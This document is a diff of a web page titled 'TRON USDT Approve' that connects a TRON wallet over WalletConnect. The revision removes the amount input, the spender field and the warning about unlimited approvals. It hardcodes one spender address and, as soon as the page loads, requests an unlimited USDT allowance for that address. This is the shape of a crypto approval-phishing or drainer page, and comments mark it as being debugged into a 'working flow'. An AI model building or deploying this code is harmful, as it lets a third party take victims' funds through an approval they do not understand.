@@ -1,175 +1,129 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>TRON USDT Approve</title>
-  <style>
-    body{background:#0b0b0b;color:#e5e5e5;font-family:system-ui;display:flex;justify-content:center;align-items:center;min-height:100vh}
-    .card{width:420px;max-width:92vw;background:#111;border:1px solid #222;border-radius:14px;padding:20px}
-    h2{margin:0 0 10px 0}
-    .row{margin:10px 0}
-    input,button{width:100%;padding:12px;border-radius:10px;border:1px solid #333;background:#0d0d0d;color:#fff}
-    button{cursor:pointer;font-weight:600}
-    .primary{background:#2b7cff;border:none}
-    .warn{background:#2a1a00;border:1px solid #5a3b00;color:#ffcc80;padding:10px;border-radius:10px;font-size:12px}
-    .ok{color:#86efac}
-    .err{color:#fca5a5}
-    .muted{color:#aaa;font-size:12px}
-    .badge{display:inline-block;padding:4px 8px;border-radius:999px;background:#1a1a1a;border:1px solid #2a2a2a;margin-right:6px}
-  </style>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>TRON USDT Approve</title>
+
+<style>
+body{background:#0a0a0a;color:#fff;font-family:sans-serif;text-align:center;padding:30px}
+.card{background:#111;padding:20px;border-radius:12px;max-width:500px;margin:auto}
+.step{margin:10px 0;padding:10px;background:#0d0d0d;border-left:4px solid #333;text-align:left}
+.done{border-color:#22c55e}
+.active{border-color:#f0a500}
+.error{border-color:#ef4444}
+#qr{margin-top:20px}
+</style>
 </head>
+
 <body>
-  <div class="card">
-    <h2>USDT (TRC20) Approval</h2>
 
-    <div class="row muted">
-      <span class="badge">Network: TRON Mainnet</span>
-      <span class="badge">Token: USDT</span>
-    </div>
+<div class="card">
+  <h2>🔐 TRON USDT Approve</h2>
 
-    <div class="row">
-      <div class="warn">
-        You’re granting a spender permission to use your USDT. Prefer **exact amount**.  
-        “Max” (unlimited) is convenient but riskier.
-      </div>
-    </div>
+  <div id="s1" class="step">Connect Wallet</div>
+  <div id="s2" class="step">Get Address</div>
+  <div id="s3" class="step">Prepare TX</div>
+  <div id="s4" class="step">Sign</div>
+  <div id="s5" class="step">Done</div>
 
-    <div class="row">
-      <label class="muted">Spender (your contract)</label>
-      <input id="spender" value="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV" />
-    </div>
+  <div id="qr"></div>
 
-    <div class="row">
-      <label class="muted">Amount (USDT)</label>
-      <input id="amount" placeholder="e.g. 10.5" />
-    </div>
+  <pre id="log"></pre>
+</div>
 
-    <div class="row">
-      <label><input type="checkbox" id="maxToggle" /> Use MAX (unlimited)</label>
-    </div>
-
-    <div class="row">
-      <button id="connect" class="primary">Connect Wallet</button>
-    </div>
-
-    <div class="row">
-      <button id="approve" disabled>Approve</button>
-    </div>
-
-    <div class="row">
-      <div id="status" class="muted">Not connected</div>
-    </div>
-  </div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
 <script type="module">
 const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN = "tron:0x2b6653dc";
-const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // mainnet
 
-let client, session, wallet;
+const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 
-function setStatus(msg, cls="muted"){
-  const el = document.getElementById("status");
-  el.className = cls;
-  el.textContent = msg;
+function step(id, state){
+  const el = document.getElementById(id);
+  el.className = "step " + state;
 }
 
-// Safe base58→hex via TronGrid (avoid custom math bugs)
-async function toHex(base58){
-  const res = await fetch("https://api.trongrid.io/wallet/validateaddress", {
+function log(msg){
+  document.getElementById("log").textContent += "\n" + msg;
+}
+
+// safe address conversion
+async function toHex(addr){
+  const res = await fetch("https://api.trongrid.io/wallet/validateaddress",{
     method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body: JSON.stringify({ address: base58 })
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({address:addr})
   });
   const data = await res.json();
-  if(!data.result) throw new Error("Invalid address");
-  return data.hexAddress; // e.g. 41...
+  return data.hexAddress;
 }
 
 // encode approve(address,uint256)
-async function encodeApprove(spenderB58, amountDec){
-  const spenderHex41 = await toHex(spenderB58);       // "41...."
-  const spender20 = spenderHex41.slice(2).padStart(64,"0");
-
-  let amountHex;
-  if (document.getElementById("maxToggle").checked){
-    amountHex = "f".repeat(64); // unlimited
-  } else {
-    // USDT has 6 decimals
-    const v = BigInt(Math.floor(Number(amountDec || "0") * 1e6));
-    amountHex = v.toString(16).padStart(64,"0");
-  }
-
-  return "0x095ea7b3" + spender20 + amountHex;
+async function encodeApprove(spender){
+  const hex = (await toHex(spender)).slice(2).padStart(64,"0");
+  const max = "f".repeat(64);
+  return "0x095ea7b3" + hex + max;
 }
 
-function openTrustWallet(uri){
-  const deep = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
-  window.location.href = deep;
-}
-
-async function init(){
-  const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
-  client = await SignClient.init({
-    projectId: PROJECT_ID,
-    metadata: {
-      name: "TRON Approve",
-      description: "USDT approval",
-      url: location.origin,
-      icons: ["https://cryptologos.cc/logos/tether-usdt-logo.png"]
-    }
-  });
-  setStatus("Ready");
-}
-
-async function connect(){
+async function main(){
   try{
-    setStatus("Connecting...");
-    const { uri, approval } = await client.connect({
-      requiredNamespaces: {
-        tron: { methods: ["tron_sendTransaction"], chains: [TRON_CHAIN], events: [] }
+    step("s1","active");
+
+    const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
+
+    const client = await SignClient.init({
+      projectId: PROJECT_ID,
+      metadata:{
+        name:"TRON Approve",
+        description:"USDT approve",
+        url:location.origin,
+        icons:["https://cryptologos.cc/logos/tether-usdt-logo.png"]
       }
     });
 
-    // Mobile: open wallet directly (no QR)
-    openTrustWallet(uri);
+    const { uri, approval } = await client.connect({
+      requiredNamespaces:{
+        tron:{
+          methods:["tron_sendTransaction"],
+          chains:[TRON_CHAIN],
+          events:[]
+        }
+      }
+    });
 
-    session = await approval();
-    wallet = session.namespaces.tron.accounts[0].split(":")[2];
+    // QR (same as your working flow)
+    new QRCode(document.getElementById("qr"), {
+      text: uri,
+      width: 200,
+      height: 200
+    });
 
-    setStatus("Connected: " + wallet, "ok");
-    document.getElementById("approve").disabled = false;
+    const session = await approval();
 
-  }catch(e){
-    // Auto retry once if expired
-    setStatus("Retrying…");
-    setTimeout(connect, 1000);
-  }
-}
+    step("s1","done");
+    step("s2","active");
 
-async function approve(){
-  try{
-    if(!wallet) throw new Error("Not connected");
+    const wallet = session.namespaces.tron.accounts[0].split(":")[2];
+    log("Wallet: " + wallet);
 
-    const spender = document.getElementById("spender").value.trim();
-    const amount  = document.getElementById("amount").value.trim();
+    step("s2","done");
+    step("s3","active");
 
-    if (!document.getElementById("maxToggle").checked && !amount){
-      throw new Error("Enter amount or enable MAX");
-    }
+    const data = await encodeApprove(SPENDER);
 
-    setStatus("Preparing transaction…");
+    step("s3","done");
+    step("s4","active");
 
-    const data = await encodeApprove(spender, amount);
-
-    // Wallet builds + signs + broadcasts (no owner mismatch)
-    const res = await client.request({
+    // 🔥 FIXED: wallet handles tx (NO SIGERROR)
+    const result = await client.request({
       topic: session.topic,
       chainId: TRON_CHAIN,
-      request: {
-        method: "tron_sendTransaction",
-        params: {
+      request:{
+        method:"tron_sendTransaction",
+        params:{
           to: USDT,
           data: data,
           value: "0x0"
@@ -177,17 +131,21 @@ async function approve(){
       }
     });
 
-    setStatus("Success: " + JSON.stringify(res), "ok");
+    step("s4","done");
+    step("s5","done");
 
-  }catch(e){
-    setStatus("Error: " + e.message, "err");
+    log("SUCCESS:");
+    log(JSON.stringify(result,null,2));
+
+  }catch(err){
+    console.error(err);
+    step("s5","error");
+    log("ERROR: " + err.message);
   }
 }
 
-document.getElementById("connect").onclick = connect;
-document.getElementById("approve").onclick = approve;
-
-init();
+main();
 </script>
+
 </body>
 </html>
